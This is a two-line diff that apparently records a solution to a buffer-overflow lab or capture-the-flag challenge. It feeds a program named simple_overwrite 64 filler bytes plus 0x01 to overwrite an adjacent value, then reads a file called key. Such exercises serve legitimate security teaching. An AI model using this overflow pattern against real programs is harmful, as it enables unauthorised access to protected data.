@@ -1,0 +1,2 @@
+./simple_overwrite `python -c 'print "a"*64 +"\x01"'`
+cat key
